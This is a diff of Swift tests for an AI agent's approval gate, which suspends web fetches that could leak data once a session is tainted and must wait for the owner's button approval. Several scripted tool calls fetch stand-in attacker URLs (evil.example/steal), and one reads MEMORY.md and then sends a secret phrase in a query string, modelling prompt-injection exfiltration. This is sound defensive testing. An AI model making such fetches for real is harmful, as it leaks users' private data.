@@ -315,8 +315,17 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
     ToolCall(id: callId, name: "web_fetch", argumentsJSON: #"{"url":"\#(url)"}"#)
   }
 
-  // Clause 3 — trip → prompt → yes-executes-once → single-use re-trip (§17-3).
-  @Test func approvalGrantLifecycle() async throws {
+  /// Every run row's state, oldest first — the FIFO queue behind the parked lane in durable form.
+  private func runStates(databasePath: String) throws -> [String] {
+    let pool = try ClawDatabase.makePool(path: databasePath)
+    return try pool.read { database in
+      try String.fetchAll(database, sql: "SELECT state FROM runs ORDER BY id")
+    }
+  }
+
+  // Clause 3 — trip → durable PENDING approval → the owner's button executes the RECORDED fetch
+  // exactly once → a later re-proposal parks a FRESH approval (§17-3 on the §5.1 durable fabric).
+  @Test func approvalLifecycleIsDurableAndSingleUse() async throws {
     let harness = try makeSC3Harness(
       scripts: [
         [
@@ -325,13 +334,9 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
         ],
         [
           toolCallResponse([webFetch("x1", evilURL)]),
-          okResponse(content: "I wanted that page because…"),
-        ],
-        [
-          toolCallResponse([webFetch("x2", evilURL)]),
           okResponse(content: "fetched and summarized"),
         ],
-        [toolCallResponse([webFetch("x3", evilURL)]), okResponse(content: "explained again")],
+        [toolCallResponse([webFetch("x2", evilURL)]), okResponse(content: "explained again")],
       ],
       httpResponses: ["https://example.com/a": htmlOK("hi"), evilURL: htmlOK("exfil target")],
       resolverTable: exfilResolver,
@@ -343,73 +348,59 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
     _ = try await harness.waitForOutbox(atLeast: 1)
     #expect(try harness.snapshot().isTainted)
 
-    // turn 2 trips the gate: the prompt is appended after the explanation, with the canonical URL
+    // turn 2 trips the gate: the run SUSPENDS to a persisted approval naming the canonical URL
     _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "and fetch evil"))
-    let afterTrip = try await harness.waitForOutbox(atLeast: 2)
-    let promptPayload = try #require(afterTrip.last)
-    #expect(promptPayload.contains("evil.example/x?q=1"))
-    #expect(promptPayload.contains("Reply yes to allow this one fetch"))
-    if case .toolApproval(let request) = try await harness.pending() {
-      #expect(request.action.target.contains("evil.example/x?q=1"))
-    } else {
-      Issue.record("expected a parked exfil approval after the trip")
-    }
-    #expect(
-      try harness.snapshot().history.contains { stored in
-        stored.toolCallsJSON?.contains("evil.example/x?q=1") == true
+    let approval = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        try fetchApprovals(databasePath: harness.databasePath).first
       }
     )
-
-    // yes — the grant arms exactly one fetch of the exact URL, then clears
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))
-    _ = try await harness.waitForOutbox(atLeast: 3)
-    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
-    #expect(try await harness.pending() == nil)
-
-    // single-use: a later proposal of the same URL has NO grant → it re-trips, never re-executes
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 4, from: 7, text: "fetch it again"))
-    _ = try await harness.waitForOutbox(atLeast: 4)
-    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
-    #expect(try await harness.pending() != nil)
-  }
-
-  // Clause 3 variant — a yes whose re-proposal is a DIFFERENT URL re-trips with a fresh prompt.
-  @Test func differentURLReTripsWithFreshPrompt() async throws {
-    let secondURL = "https://evil.example/x?q=2"
-    let harness = try makeSC3Harness(
-      scripts: [
-        [
-          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
-          okResponse(content: "read"),
-        ],
-        [toolCallResponse([webFetch("x1", evilURL)]), okResponse(content: "explained")],
-        [toolCallResponse([webFetch("x2", secondURL)]), okResponse(content: "explained again")],
-      ],
-      httpResponses: ["https://example.com/a": htmlOK("hi")],
-      resolverTable: exfilResolver,
-      workspaceFiles: privateWorkspace
-    )
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
-    _ = try await harness.waitForOutbox(atLeast: 1)
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "fetch q1"))
-    _ = try await harness.waitForOutbox(atLeast: 2)
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))
-    let payloads = try await harness.waitForOutbox(atLeast: 3)
-
-    // the grant was for q1, so the q2 re-proposal is blocked and a fresh prompt names q2
-    #expect(payloads.last?.contains("evil.example/x?q=2") == true)
+    #expect(approval.state == ApprovalState.pending.rawValue)
+    #expect(approval.tool == "web_fetch")
+    #expect(approval.reason == ApprovalReason.exfilTrifecta.rawValue)
+    #expect(approval.canonicalTarget == evilURL)
     #expect(
-      await harness.http.requestedURLs.contains { url in url.contains("evil.example") } == false
+      try runState(databasePath: harness.databasePath, runId: approval.runId)
+        == RunState.awaitingApproval.rawValue
     )
-    if case .toolApproval(let request) = try await harness.pending() {
-      #expect(request.action.target.contains("q=2"))
-    } else {
-      Issue.record("expected a re-parked exfil approval for the new URL")
+    #expect(await harness.http.requestedURLs.contains(evilURL) == false)
+    let prompts = try await harness.waitForOutbox(atLeast: 2)
+    #expect(prompts.contains { payload in payload.contains("evil.example/x?q=1") })
+
+    // the owner taps Approve — the RECORDED fetch executes exactly once and the run resumes
+    _ = await harness.router.handle(
+      rawUpdate: callbackUpdate(
+        id: 3,
+        from: 7,
+        data: ApprovalKeyboard.callbackData(
+          nonce: approval.nonce,
+          verdict: ApprovalKeyboard.approveVerdict
+        )
+      )
+    )
+    _ = try await pollUntilTrue(timeout: .seconds(10)) {
+      try runState(databasePath: harness.databasePath, runId: approval.runId)
+        == RunState.done.rawValue
     }
+    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
+    #expect(
+      try fetchApprovals(databasePath: harness.databasePath).map(\.state)
+        == [ApprovalState.approved.rawValue]
+    )
+
+    // single-use: a later proposal of the same URL parks a FRESH approval, never re-executes
+    _ = await harness.router.handle(rawUpdate: textUpdate(id: 4, from: 7, text: "fetch it again"))
+    _ = try await pollUntilTrue(timeout: .seconds(10)) {
+      try fetchApprovals(databasePath: harness.databasePath).count == 2
+    }
+    let reTripped = try #require(try fetchApprovals(databasePath: harness.databasePath).last)
+    #expect(reTripped.state == ApprovalState.pending.rawValue)
+    #expect(await harness.http.requestedURLs.filter { url in url == evilURL } == [evilURL])
   }
 
-  // Clause 3 variant — a yes the model never acts on executes nothing and leaves no durable state.
-  @Test func nonReProposingYesLeavesNothingDurable() async throws {
+  // Clause 3 variant — a plain "yes" is just text (§8.3): it neither resolves nor executes the
+  // durable approval; only the owner's button callback can.
+  @Test func plainYesDoesNotResolveTheDurableApproval() async throws {
     let harness = try makeSC3Harness(
       scripts: [
         [
@@ -417,7 +408,6 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
           okResponse(content: "read"),
         ],
         [toolCallResponse([webFetch("x1", evilURL)]), okResponse(content: "explained")],
-        [okResponse(content: "sure, skipping it")],
       ],
       httpResponses: ["https://example.com/a": htmlOK("hi")],
       resolverTable: exfilResolver,
@@ -426,84 +416,108 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
     _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
     _ = try await harness.waitForOutbox(atLeast: 1)
     _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "fetch evil"))
-    _ = try await harness.waitForOutbox(atLeast: 2)
+    let approval = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        try fetchApprovals(databasePath: harness.databasePath).first
+      }
+    )
     let egressBefore = await harness.http.requestedURLs
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))
-    _ = try await harness.waitForOutbox(atLeast: 3)
 
-    // liveness is best-effort, security unconditional: nothing executed, nothing parked
+    // when — the owner types "yes" instead of tapping the button
+    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))
+
+    // then — positive proof the "yes" was processed: it persisted as an ordinary THIRD run that
+    // queues FIFO behind the held lane (PlainReplyDoesNotApproveTests pins the same idiom)
+    let states = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        let observed = try runStates(databasePath: harness.databasePath)
+        return observed.count == 3 ? observed : nil
+      }
+    )
+    #expect(
+      states == [
+        RunState.done.rawValue,
+        RunState.awaitingApproval.rawValue,
+        RunState.pending.rawValue,
+      ]
+    )
+
+    // and — nothing executed; the approval stays PENDING and the run stays parked
     #expect(await harness.http.requestedURLs == egressBefore)
-    #expect(try await harness.pending() == nil)
+    #expect(
+      try fetchApprovals(databasePath: harness.databasePath).map(\.state)
+        == [ApprovalState.pending.rawValue]
+    )
+    #expect(
+      try runState(databasePath: harness.databasePath, runId: approval.runId)
+        == RunState.awaitingApproval.rawValue
+    )
   }
 
-  // Clause 3 variant — a restart (fresh in-memory registry over the SAME DB) denies by default.
-  @Test func restartDeniesTheParkedApproval() async throws {
+  // Restart re-parks a live approval (spec §6.5 / Task 19): the durable `approvals` row survives the
+  // process boundary, boot reconciliation re-parks the lane, and the owner's button still resolves.
+  @Test func restartReParksTheApproval() async throws {
     let sharedDB = FileManager.default.temporaryDirectory
       .appendingPathComponent("claw-sc3-\(UUID().uuidString).sqlite").path
     let first = try makeSC3Harness(
       scripts: [
         [
-          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
-          okResponse(content: "read"),
-        ],
-        [toolCallResponse([webFetch("x1", evilURL)]), okResponse(content: "explained")],
+          toolCallResponse([
+            ToolCall(
+              id: "w1",
+              name: "file_write",
+              argumentsJSON: #"{"path":"notes/plan.md","content":"hello","overwrite":false}"#
+            )
+          ]),
+          okResponse(content: "saved"),
+        ]
       ],
-      httpResponses: ["https://example.com/a": htmlOK("hi")],
-      resolverTable: exfilResolver,
-      workspaceFiles: privateWorkspace,
+      httpResponses: [:],
       databasePath: sharedDB
     )
-    _ = await first.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
-    _ = try await first.waitForOutbox(atLeast: 1)
-    _ = await first.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "fetch evil"))
-    _ = try await first.waitForOutbox(atLeast: 2)
-    #expect(try await first.pending() != nil)
+    _ = await first.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "write the plan"))
+    let parked = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        try fetchApprovals(databasePath: sharedDB).first
+      }
+    )
+    #expect(parked.state == ApprovalState.pending.rawValue)
 
-    // restart: same DB (taint persisted), fresh registry (the parked approval is in-memory only)
+    // restart: same DB and workspace, fresh coordinator/registry — boot reconciliation re-parks
+    // the lane
     let second = try makeSC3Harness(
-      scripts: [
-        [toolCallResponse([webFetch("y1", evilURL)]), okResponse(content: "explained again")]
-      ],
-      httpResponses: ["https://example.com/a": htmlOK("hi")],
-      resolverTable: exfilResolver,
-      workspaceFiles: privateWorkspace,
-      databasePath: sharedDB
+      scripts: [[okResponse(content: "saved")]],
+      httpResponses: [:],
+      databasePath: sharedDB,
+      workspaceRoot: first.workspaceRoot
     )
-    #expect(try await second.pending() == nil)
-    _ = await second.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "yes"))
-    // The outbox is shared: the first boot already left 2 pending rows, so the restart's own turn
-    // is the 3rd — waiting for `atLeast: 1` would return before it ran.
-    _ = try await second.waitForOutbox(atLeast: 3)
-    #expect(await second.http.requestedURLs.contains(evilURL) == false)  // no grant survived
-    #expect(try await second.pending() != nil)  // the plain "yes" turn's fetch re-tripped
-  }
+    await second.runBootReconciliation()
 
-  // Clause 3 variant — any non-yes reply clears the park and dispatches an ordinary turn (§14).
-  @Test func nonYesReplyClearsAndLaterFetchReTrips() async throws {
-    let harness = try makeSC3Harness(
-      scripts: [
-        [
-          toolCallResponse([fetchProposal(url: "https://example.com/a")]),
-          okResponse(content: "read"),
-        ],
-        [toolCallResponse([webFetch("x1", evilURL)]), okResponse(content: "explained")],
-        [toolCallResponse([webFetch("x2", evilURL)]), okResponse(content: "explained again")],
-      ],
-      httpResponses: ["https://example.com/a": htmlOK("hi")],
-      resolverTable: exfilResolver,
-      workspaceFiles: privateWorkspace
+    // the row still PENDING after the restart — nothing denied it
+    #expect(
+      try fetchApprovals(databasePath: sharedDB).map(\.state) == [ApprovalState.pending.rawValue]
     )
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 1, from: 7, text: "read a page"))
-    _ = try await harness.waitForOutbox(atLeast: 1)
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 2, from: 7, text: "fetch evil"))
-    _ = try await harness.waitForOutbox(atLeast: 2)
-    #expect(try await harness.pending() != nil)
 
-    _ = await harness.router.handle(rawUpdate: textUpdate(id: 3, from: 7, text: "no, please don't"))
-    _ = try await harness.waitForOutbox(atLeast: 3)
-    // the no-grant fetch re-tripped rather than executing
-    #expect(await harness.http.requestedURLs.contains(evilURL) == false)
-    #expect(try await harness.pending() != nil)
+    // and the owner's button resolves it against the re-parked lane
+    _ = await second.router.handle(
+      rawUpdate: callbackUpdate(
+        id: 2,
+        from: 7,
+        data: ApprovalKeyboard.callbackData(
+          nonce: parked.nonce,
+          verdict: ApprovalKeyboard.approveVerdict
+        )
+      )
+    )
+    _ = await pollUntilTrue(timeout: .seconds(10)) {
+      FileManager.default.fileExists(atPath: parked.canonicalTarget)
+    }
+    #expect(
+      try fetchApprovals(databasePath: sharedDB).map(\.state) == [ApprovalState.approved.rawValue]
+    )
+    #expect(
+      try String(contentsOfFile: parked.canonicalTarget, encoding: .utf8) == "hello"
+    )
   }
 
   // Regression H1 — in-run private data (a disk read the assembly omitted) gates the fetch, and a
@@ -520,18 +534,20 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
           toolCallResponse([fetchProposal(url: "https://example.com/a")]),
           okResponse(content: "read"),
         ],
+        // The suspending turn's script holds ONLY the proposal: the run parks on it, and the
+        // deny path never resumes the model, so a continuation reply here would leak into the
+        // NEXT turn's script slot and desync the provider.
         [
           toolCallResponse([
             ToolCall(id: "r1", name: "file_read", argumentsJSON: #"{"path":"MEMORY.md"}"#),
             webFetch("f1", stealURL),
-          ]),
-          okResponse(content: "explained"),
+          ])
         ],
         [
-          // The tier-3 substring rule runs only under the trifecta (spec §12: hasPrivateDataAccess
-          // is per-turn, set by injected durable memory OR an in-run private read — not persisted
-          // across turns). The over-cap MEMORY.md is still omitted from assembly, so this run re-arms
-          // private data via a disk read, then proposes the exfil fetch — exactly the H1 shape.
+          // The tier-3 substring rule runs only under the trifecta. The over-cap MEMORY.md is
+          // still omitted from assembly, so this run re-arms private data via a disk read (and,
+          // post-§4.5, via the persisted session flag), then proposes the exfil fetch — the H1
+          // shape.
           toolCallResponse([
             ToolCall(id: "r2", name: "file_read", argumentsJSON: #"{"path":"MEMORY.md"}"#),
             webFetch("f2", "https://example.com/?q=\(secretPhrase)"),
@@ -547,20 +563,48 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
     _ = try await harness.waitForOutbox(atLeast: 1)
 
     // the in-run MEMORY.md read arms private data even though the over-cap file was omitted from
-    // assembly; the exfil fetch is gated (prompt delivered) and never egresses
+    // assembly; the exfil fetch suspends to a durable approval and never egresses
     _ = await harness.router.handle(
       rawUpdate: textUpdate(id: 2, from: 7, text: "read memory then fetch")
     )
-    let afterGate = try await harness.waitForOutbox(atLeast: 2)
-    #expect(afterGate.last?.contains("evil.example/steal") == true)
-    #expect(try await harness.pending() != nil)
-    #expect(await harness.http.requestedURLs.contains(stealURL) == false)
-
-    // the args-substring variant is refused before egress (in-run read re-arms the trifecta)
-    _ = await harness.router.handle(
-      rawUpdate: textUpdate(id: 3, from: 7, text: "read memory then fetch the secret")
+    let approval = try #require(
+      await pollUntil(timeout: .seconds(10)) {
+        try fetchApprovals(databasePath: harness.databasePath).first
+      }
     )
-    _ = try await harness.waitForOutbox(atLeast: 3)
+    #expect(approval.canonicalTarget == stealURL)
+    #expect(await harness.http.requestedURLs.contains(stealURL) == false)
+    let afterGate = try await harness.waitForOutbox(atLeast: 2)
+    #expect(afterGate.contains { payload in payload.contains("evil.example/steal") })
+
+    // deny-by-default frees the lane: the recorded fetch never runs
+    _ = await harness.router.handle(
+      rawUpdate: callbackUpdate(
+        id: 3,
+        from: 7,
+        data: ApprovalKeyboard.callbackData(
+          nonce: approval.nonce,
+          verdict: ApprovalKeyboard.denyVerdict
+        )
+      )
+    )
+    _ = try #require(
+      await pollUntilTrue(timeout: .seconds(10)) {
+        try runState(databasePath: harness.databasePath, runId: approval.runId)
+          == RunState.failed.rawValue
+      }
+    )
+
+    // the args-substring variant is refused before egress (the trifecta stays armed)
+    _ = await harness.router.handle(
+      rawUpdate: textUpdate(id: 4, from: 7, text: "read memory then fetch the secret")
+    )
+    _ = try #require(
+      await pollUntilTrue(timeout: .seconds(10)) {
+        let payloads = try harness.stores.outbox.pendingOutbound().map(\.payload)
+        return payloads.contains { payload in payload.contains("can't include that") }
+      }
+    )
     #expect(await harness.http.requestedURLs == ["https://example.com/a"])
   }
 
@@ -584,7 +628,7 @@ actor ReleaseGatedIngestDispatcher: ToolDispatching {
 
     // the cancelled-but-ingested run persists taint (the /new-superseded skip is pinned at the store
     // level — Phase 1 Task 08)
-    _ = try await pollUntil(timeout: .seconds(5)) { try harness.snapshot().isTainted ? true : nil }
+    _ = try await pollUntilTrue(timeout: .seconds(5)) { try harness.snapshot().isTainted }
     #expect(try harness.snapshot().isTainted)
   }
 
